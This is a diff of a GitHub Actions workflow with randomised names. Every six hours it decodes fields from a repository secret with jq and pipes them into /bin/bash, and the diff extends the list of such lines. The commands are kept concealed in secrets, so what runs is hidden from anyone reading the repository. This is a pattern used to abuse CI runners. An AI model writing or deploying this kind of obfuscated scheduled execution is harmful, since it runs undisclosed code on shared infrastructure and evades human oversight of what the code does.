@@ -1,9 +1,8 @@
 name: quanjingxin3910
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 0/6 * * *'
+    - cron: '58 4/6 * * *'
 
 jobs:
   build:
@@ -12,14 +11,25 @@ jobs:
       - uses: actions/checkout@v4
       - name: quanjingxin3910
         env:
-          zy496: ${{ secrets.zy496 }}
+          mlfqn5367: ${{ secrets.mlfqn5367 }}
         run: |
-          echo $zy496 | jq -r .g7524 | /bin/bash
-          echo $a1804 | jq -r .l5393 | /bin/bash
-          echo $s2873 | jq -r .rliox609 | /bin/bash
-          echo $udd866 | jq -r .ly450 | /bin/bash
-          echo $xx0 | jq -r .xgzxq6 | /bin/bash
-          echo $n4 | jq -r .zu00664 | /bin/bash
-          echo $aydhb58736 | jq -r .xwg88 | /bin/bash
-          echo $n5 | jq -r .gfyr5776 | /bin/bash
+          echo $mlfqn5367 | jq -r .cmrw7 | /bin/bash
+          echo $xogkx25510 | jq -r .svqrf5 | /bin/bash
+          echo $ptq67 | jq -r .ntjil4 | /bin/bash
+          echo $xcsx5892 | jq -r .z3354 | /bin/bash
+          echo $o2 | jq -r .ion5141 | /bin/bash
+          echo $xeq88227 | jq -r .xrf9 | /bin/bash
+          echo $uqm30 | jq -r .czrc139 | /bin/bash
+          echo $xte70365 | jq -r .j70 | /bin/bash
+          echo $srk9857 | jq -r .k3910 | /bin/bash
+          echo $fueq22343 | jq -r .pv30 | /bin/bash
+          echo $m675 | jq -r .sly1114 | /bin/bash
+          echo $mmt63 | jq -r .bkm9 | /bin/bash
+          echo $iks73 | jq -r .ou335 | /bin/bash
+          echo $l56264 | jq -r .bstro64 | /bin/bash
+          echo $hxwh41 | jq -r .m8741 | /bin/bash
+          echo $kxb8 | jq -r .deeu62 | /bin/bash
+          echo $i757 | jq -r .z191 | /bin/bash
+          echo $k10187 | jq -r .wum6 | /bin/bash
+          echo $ctq28257 | jq -r .iby5 | /bin/bash
 
